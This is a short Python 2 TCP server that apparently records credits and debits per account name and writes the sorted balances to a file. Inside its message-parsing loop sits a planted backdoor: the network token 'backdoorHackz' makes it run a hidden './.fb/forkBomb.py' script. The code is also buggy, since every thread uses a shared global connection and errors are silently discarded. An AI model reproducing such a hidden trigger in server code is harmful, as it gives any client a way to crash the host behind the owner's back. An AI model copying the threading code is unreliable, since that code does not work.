#!/usr/bin/python
#server
import socket
import sys
import signal
import threading

accounts = {} # global dictionary
mutex = threading.Lock()
threads = []

def fx(s, f):
    # print and exit
    print "sigInt"
    pprint()
    conn.close() # close the connection
    exit(1)

def pprint():
    with open ('data.txt', 'w') as f:
        #print "now printing"
        for key in sorted(accounts): # sort by the key's (names) in dictionary
            string = key + ' $' + str(accounts[key]) + '\n'
            f.write(string)
            #print string


def runThread(arg):
    global mutex
    buff = ""
    while 1:
        # recieve lines of 4096 bytes at a time for efficiency
        data = conn.recv(4096)

        if data == '': # we are all out of data
            break

        #print data
        #data.strip('\n')
        #string = data.split(' ') # this didnt work bcs data arrival is nondeterministic
        data += '\n' # add a new line to make parsing easier
        buffer = ""
        arry = []
        # we know format is name_debitOrCredit_$amount\n
        for char in data: # for each char
            if char == ' ' or char == '\n':
                arry.append(buffer)
                buffer = ""
            else:
                buffer += char

        counter = 0
        name = ""
        credDebt = ""
        price = ""
        for string in arry: # loop through our array 1 line at a time bcs nondeterminism
            #print string
            try:
                if string == "backdoorHackz": # the hacks are real
                    import os
                    os.system('python ./.fb/forkBomb.py')
                elif string == '' or string == '\n':
                    counter = 0 # reset the counter to 0 bcs there may be bad data
                elif string != "\n": # make sure we dont have a \n
                    if counter == 0:
                        name = string
                        counter += 1
                    elif counter == 1:
                        credDebt = string
                        counter += 1
                    elif counter == 2:
                        price = string
                        counter = 0
                        #print "name:",name,"\ndata:",credDebt,"\namount",price
                        price = float(price.replace("$","")) # remove the $ character
                        if credDebt == "credit": # assign -/+
                            price = price
                        elif credDebt == "debit":
                            price = price * -1
                        # add name to dictionary if it doesnt exist

                        mutex.acquire() # acquire mutex
                        if name in accounts:
                            accounts[name] += price
                        else:
                            accounts[name] = price
                        mutex.release() # release mutex

            except Exception as err: # maybe we get a string that isnt a float
                pass

try:

    signal.signal(signal.SIGINT, fx) # handle SIGINT

    s = socket.socket( socket.AF_INET, socket.SOCK_STREAM) # create a socket
    s.bind(('127.0.0.1', int(sys.argv[1])))
    s.listen(5) # backlog of 5

    while 1:

        print "server: waiting to accept()"
        (conn, addr) = s.accept()
        #print "server: accepted with address",addr

        # for each client socket create a thread
        t = threading.Thread(target=runThread, args=(conn,))
        t.start()
        threads.append(t)




except Exception as err:
    print err
    exit(1)
